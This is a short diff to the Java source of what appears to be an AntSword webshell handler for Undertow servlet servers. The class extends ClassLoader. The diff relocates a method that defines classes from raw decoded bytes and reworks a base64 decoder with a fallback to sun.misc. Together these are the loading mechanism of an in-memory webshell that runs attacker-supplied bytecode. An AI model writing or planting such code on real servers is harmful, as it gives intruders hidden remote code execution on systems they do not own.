@@ -9,11 +9,6 @@ public class AntSwordUndertowServletHandler extends ClassLoader {
     public static String headerName;
     public static String headerValue;
 
-    @SuppressWarnings("all")
-    public Class<?> g(byte[] b) {
-        return super.defineClass(b, 0, b.length);
-    }
-
     public AntSwordUndertowServletHandler() {
     }
 
@@ -48,7 +43,12 @@ public class AntSwordUndertowServletHandler extends ClassLoader {
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public Class<?> g(byte[] b) {
+        return super.defineClass(b, 0, b.length);
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
@@ -56,12 +56,9 @@ public class AntSwordUndertowServletHandler extends ClassLoader {
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
